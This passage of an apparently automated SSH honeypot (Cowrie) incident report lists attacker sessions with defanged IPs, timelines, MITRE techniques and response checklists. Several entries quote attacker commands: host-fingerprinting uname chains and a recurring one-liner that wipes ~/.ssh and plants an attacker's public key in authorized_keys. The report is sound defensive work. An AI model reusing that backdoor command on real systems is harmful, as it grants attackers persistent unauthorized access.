| `2026-07-01 15:01:38` | `cowrie.command.input` |
| `2026-07-01 15:01:38` | `cowrie.session.file_download` |
| `2026-07-01 15:01:38` | `cowrie.log.closed` |
| `2026-07-01 15:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.173.43[.]34` to AbuseIPDB if not already reported
- [ ] Block `41.173.43[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-020d99f0333b

| Field | Detail |
|---|---|
| **Source IP** | `41.173.43[.]34` |
| **First Seen** | 2026-07-01 15:01 |
| **Last Seen** | 2026-07-01 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:01:38` | `cowrie.session.connect` |
| `2026-07-01 15:01:38` | `cowrie.client.version` |
| `2026-07-01 15:01:39` | `cowrie.client.kex` |
| `2026-07-01 15:01:40` | `cowrie.login.success` |
| `2026-07-01 15:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.173.43[.]34` to AbuseIPDB if not already reported
- [ ] Block `41.173.43[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ff31d959023

| Field | Detail |
|---|---|
| **Source IP** | `41.173.43[.]34` |
| **First Seen** | 2026-07-01 15:01 |
| **Last Seen** | 2026-07-01 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:01:40` | `cowrie.session.connect` |
| `2026-07-01 15:01:40` | `cowrie.client.version` |
| `2026-07-01 15:01:41` | `cowrie.client.kex` |
| `2026-07-01 15:01:42` | `cowrie.login.success` |
| `2026-07-01 15:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.173.43[.]34` to AbuseIPDB if not already reported
- [ ] Block `41.173.43[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-493e18f7fec0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 15:02 |
| **Last Seen** | 2026-07-01 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:02:13` | `cowrie.session.connect` |
| `2026-07-01 15:02:13` | `cowrie.client.version` |
| `2026-07-01 15:02:13` | `cowrie.client.kex` |
| `2026-07-01 15:02:13` | `cowrie.login.success` |
| `2026-07-01 15:02:14` | `cowrie.session.params` |
| `2026-07-01 15:02:14` | `cowrie.command.input` |
| `2026-07-01 15:02:14` | `cowrie.command.input` |
| `2026-07-01 15:02:14` | `cowrie.command.input` |
| `2026-07-01 15:02:14` | `cowrie.command.input` |
| `2026-07-01 15:02:14` | `cowrie.command.input` |
| `2026-07-01 15:02:14` | `cowrie.command.success` |
| `2026-07-01 15:02:14` | `cowrie.command.input` |
| `2026-07-01 15:02:14` | `cowrie.command.input` |
| `2026-07-01 15:02:14` | `cowrie.command.input` |
| `2026-07-01 15:02:14` | `cowrie.command.input` |
| `2026-07-01 15:02:14` | `cowrie.log.closed` |
| `2026-07-01 15:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a03cf65887a

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-07-01 15:02 |
| **Last Seen** | 2026-07-01 15:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:02:27` | `cowrie.session.connect` |
| `2026-07-01 15:02:27` | `cowrie.client.version` |
| `2026-07-01 15:02:27` | `cowrie.client.kex` |
| `2026-07-01 15:02:29` | `cowrie.login.success` |
| `2026-07-01 15:02:30` | `cowrie.session.params` |
| `2026-07-01 15:02:30` | `cowrie.command.input` |
| `2026-07-01 15:02:30` | `cowrie.command.failed` |
| `2026-07-01 15:02:30` | `cowrie.log.closed` |
| `2026-07-01 15:02:31` | `cowrie.session.params` |
| `2026-07-01 15:02:31` | `cowrie.command.input` |
| `2026-07-01 15:02:32` | `cowrie.session.file_download` |
| `2026-07-01 15:02:32` | `cowrie.log.closed` |
| `2026-07-01 15:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-084eb851dbf5

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-07-01 15:02 |
| **Last Seen** | 2026-07-01 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:02:32` | `cowrie.session.connect` |
| `2026-07-01 15:02:32` | `cowrie.client.version` |
| `2026-07-01 15:02:32` | `cowrie.client.kex` |
| `2026-07-01 15:02:33` | `cowrie.login.success` |
| `2026-07-01 15:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20c0ff120c0c

| Field | Detail |
|---|---|
| **Source IP** | `183.222.230[.]188` |
| **First Seen** | 2026-07-01 15:02 |
| **Last Seen** | 2026-07-01 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:02:34` | `cowrie.session.connect` |
| `2026-07-01 15:02:34` | `cowrie.client.version` |
| `2026-07-01 15:02:34` | `cowrie.client.kex` |
| `2026-07-01 15:02:35` | `cowrie.login.success` |
| `2026-07-01 15:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.222.230[.]188` to AbuseIPDB if not already reported
- [ ] Block `183.222.230[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de2ca73700b5

| Field | Detail |
|---|---|
| **Source IP** | `52.172.177[.]191` |
| **First Seen** | 2026-07-01 15:03 |
| **Last Seen** | 2026-07-01 15:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:03:13` | `cowrie.session.connect` |
| `2026-07-01 15:03:13` | `cowrie.client.version` |
| `2026-07-01 15:03:14` | `cowrie.client.kex` |
| `2026-07-01 15:03:14` | `cowrie.login.success` |
| `2026-07-01 15:03:15` | `cowrie.session.params` |
| `2026-07-01 15:03:15` | `cowrie.command.input` |
| `2026-07-01 15:03:15` | `cowrie.command.failed` |
| `2026-07-01 15:03:16` | `cowrie.log.closed` |
| `2026-07-01 15:03:17` | `cowrie.session.params` |
| `2026-07-01 15:03:17` | `cowrie.command.input` |
| `2026-07-01 15:03:17` | `cowrie.session.file_download` |
| `2026-07-01 15:03:17` | `cowrie.log.closed` |
| `2026-07-01 15:03:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.172.177[.]191` to AbuseIPDB if not already reported
- [ ] Block `52.172.177[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b83f67f76f1b

| Field | Detail |
|---|---|
| **Source IP** | `52.172.177[.]191` |
| **First Seen** | 2026-07-01 15:03 |
| **Last Seen** | 2026-07-01 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:03:17` | `cowrie.session.connect` |
| `2026-07-01 15:03:17` | `cowrie.client.version` |
| `2026-07-01 15:03:17` | `cowrie.client.kex` |
| `2026-07-01 15:03:18` | `cowrie.login.success` |
| `2026-07-01 15:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.172.177[.]191` to AbuseIPDB if not already reported
- [ ] Block `52.172.177[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-781cb6f6e839

| Field | Detail |
|---|---|
| **Source IP** | `52.172.177[.]191` |
| **First Seen** | 2026-07-01 15:03 |
| **Last Seen** | 2026-07-01 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:03:18` | `cowrie.session.connect` |
| `2026-07-01 15:03:18` | `cowrie.client.version` |
| `2026-07-01 15:03:19` | `cowrie.client.kex` |
| `2026-07-01 15:03:19` | `cowrie.login.success` |
| `2026-07-01 15:03:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.172.177[.]191` to AbuseIPDB if not already reported
- [ ] Block `52.172.177[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e50159cdbc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 15:04 |
| **Last Seen** | 2026-07-01 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:04:55` | `cowrie.session.connect` |
| `2026-07-01 15:04:55` | `cowrie.client.version` |
| `2026-07-01 15:04:55` | `cowrie.client.kex` |
| `2026-07-01 15:04:55` | `cowrie.login.success` |
| `2026-07-01 15:04:56` | `cowrie.session.params` |
| `2026-07-01 15:04:56` | `cowrie.command.input` |
| `2026-07-01 15:04:56` | `cowrie.log.closed` |
| `2026-07-01 15:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a9fd95aec55

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 15:06 |
| **Last Seen** | 2026-07-01 15:06 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:06:02` | `cowrie.session.connect` |
| `2026-07-01 15:06:04` | `cowrie.client.version` |
| `2026-07-01 15:06:04` | `cowrie.client.kex` |
| `2026-07-01 15:06:11` | `cowrie.login.success` |
| `2026-07-01 15:06:14` | `cowrie.session.params` |
| `2026-07-01 15:06:14` | `cowrie.command.input` |
| `2026-07-01 15:06:17` | `cowrie.log.closed` |
| `2026-07-01 15:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1490df3a3d2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 15:06 |
| **Last Seen** | 2026-07-01 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:06:48` | `cowrie.session.connect` |
| `2026-07-01 15:06:48` | `cowrie.client.version` |
| `2026-07-01 15:06:48` | `cowrie.client.kex` |
| `2026-07-01 15:06:48` | `cowrie.login.success` |
| `2026-07-01 15:06:49` | `cowrie.session.params` |
| `2026-07-01 15:06:49` | `cowrie.command.input` |
| `2026-07-01 15:06:49` | `cowrie.command.input` |
| `2026-07-01 15:06:49` | `cowrie.command.input` |
| `2026-07-01 15:06:49` | `cowrie.command.input` |
| `2026-07-01 15:06:49` | `cowrie.command.input` |
| `2026-07-01 15:06:49` | `cowrie.command.success` |
| `2026-07-01 15:06:49` | `cowrie.command.input` |
| `2026-07-01 15:06:49` | `cowrie.command.input` |
| `2026-07-01 15:06:49` | `cowrie.command.input` |
| `2026-07-01 15:06:49` | `cowrie.command.input` |
| `2026-07-01 15:06:49` | `cowrie.log.closed` |
| `2026-07-01 15:06:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95c3e8ae35a2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 15:11 |
| **Last Seen** | 2026-07-01 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:11:46` | `cowrie.session.connect` |
| `2026-07-01 15:11:46` | `cowrie.client.version` |
| `2026-07-01 15:11:46` | `cowrie.client.kex` |
| `2026-07-01 15:11:46` | `cowrie.login.success` |
| `2026-07-01 15:11:47` | `cowrie.session.params` |
| `2026-07-01 15:11:47` | `cowrie.command.input` |
| `2026-07-01 15:11:47` | `cowrie.command.input` |
| `2026-07-01 15:11:47` | `cowrie.command.input` |
| `2026-07-01 15:11:47` | `cowrie.command.input` |
| `2026-07-01 15:11:47` | `cowrie.command.input` |
| `2026-07-01 15:11:47` | `cowrie.command.success` |
| `2026-07-01 15:11:47` | `cowrie.command.input` |
| `2026-07-01 15:11:47` | `cowrie.command.input` |
| `2026-07-01 15:11:47` | `cowrie.command.input` |
| `2026-07-01 15:11:47` | `cowrie.command.input` |
| `2026-07-01 15:11:47` | `cowrie.log.closed` |
| `2026-07-01 15:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8177a612650c

| Field | Detail |
|---|---|
| **Source IP** | `43.165.180[.]54` |
| **First Seen** | 2026-07-01 15:12 |
| **Last Seen** | 2026-07-01 15:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:12:55` | `cowrie.session.connect` |
| `2026-07-01 15:12:55` | `cowrie.client.version` |
| `2026-07-01 15:12:55` | `cowrie.client.kex` |
| `2026-07-01 15:12:56` | `cowrie.login.success` |
| `2026-07-01 15:12:57` | `cowrie.session.params` |
| `2026-07-01 15:12:57` | `cowrie.command.input` |
| `2026-07-01 15:12:57` | `cowrie.command.failed` |
| `2026-07-01 15:12:57` | `cowrie.log.closed` |
| `2026-07-01 15:12:58` | `cowrie.session.params` |
| `2026-07-01 15:12:58` | `cowrie.command.input` |
| `2026-07-01 15:12:58` | `cowrie.session.file_download` |
| `2026-07-01 15:12:58` | `cowrie.log.closed` |
| `2026-07-01 15:13:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.180[.]54` to AbuseIPDB if not already reported
- [ ] Block `43.165.180[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab4d099a2170

| Field | Detail |
|---|---|
| **Source IP** | `43.165.180[.]54` |
| **First Seen** | 2026-07-01 15:12 |
| **Last Seen** | 2026-07-01 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:12:58` | `cowrie.session.connect` |
| `2026-07-01 15:12:58` | `cowrie.client.version` |
| `2026-07-01 15:12:58` | `cowrie.client.kex` |
| `2026-07-01 15:12:59` | `cowrie.login.success` |
| `2026-07-01 15:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.180[.]54` to AbuseIPDB if not already reported
- [ ] Block `43.165.180[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a81ba0917e4

| Field | Detail |
|---|---|
| **Source IP** | `43.165.180[.]54` |
| **First Seen** | 2026-07-01 15:12 |
| **Last Seen** | 2026-07-01 15:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:12:59` | `cowrie.session.connect` |
| `2026-07-01 15:12:59` | `cowrie.client.version` |
| `2026-07-01 15:12:59` | `cowrie.client.kex` |
| `2026-07-01 15:13:00` | `cowrie.login.success` |
| `2026-07-01 15:13:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.180[.]54` to AbuseIPDB if not already reported
- [ ] Block `43.165.180[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed0e097e1a48

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 15:17 |
| **Last Seen** | 2026-07-01 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:17:04` | `cowrie.session.connect` |
| `2026-07-01 15:17:04` | `cowrie.client.version` |
| `2026-07-01 15:17:04` | `cowrie.client.kex` |
| `2026-07-01 15:17:05` | `cowrie.login.success` |
| `2026-07-01 15:17:05` | `cowrie.session.params` |
| `2026-07-01 15:17:05` | `cowrie.command.input` |
| `2026-07-01 15:17:05` | `cowrie.command.input` |
| `2026-07-01 15:17:05` | `cowrie.command.input` |
| `2026-07-01 15:17:05` | `cowrie.command.input` |
| `2026-07-01 15:17:05` | `cowrie.command.input` |
| `2026-07-01 15:17:05` | `cowrie.command.success` |
| `2026-07-01 15:17:05` | `cowrie.command.input` |
| `2026-07-01 15:17:05` | `cowrie.command.input` |
| `2026-07-01 15:17:05` | `cowrie.command.input` |
| `2026-07-01 15:17:05` | `cowrie.command.input` |
| `2026-07-01 15:17:06` | `cowrie.log.closed` |
| `2026-07-01 15:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-545a99974756

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 15:17 |
| **Last Seen** | 2026-07-01 15:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:17:58` | `cowrie.session.connect` |
| `2026-07-01 15:17:59` | `cowrie.client.version` |
| `2026-07-01 15:17:59` | `cowrie.client.kex` |
| `2026-07-01 15:18:02` | `cowrie.login.success` |
| `2026-07-01 15:18:04` | `cowrie.session.params` |
| `2026-07-01 15:18:04` | `cowrie.command.input` |
| `2026-07-01 15:18:05` | `cowrie.log.closed` |
| `2026-07-01 15:18:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09c89c305399

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 15:18 |
| **Last Seen** | 2026-07-01 15:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:18:19` | `cowrie.session.connect` |
| `2026-07-01 15:18:20` | `cowrie.client.version` |
| `2026-07-01 15:18:20` | `cowrie.client.kex` |
| `2026-07-01 15:18:27` | `cowrie.login.success` |
| `2026-07-01 15:18:30` | `cowrie.session.params` |
| `2026-07-01 15:18:30` | `cowrie.command.input` |
| `2026-07-01 15:18:32` | `cowrie.log.closed` |
| `2026-07-01 15:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
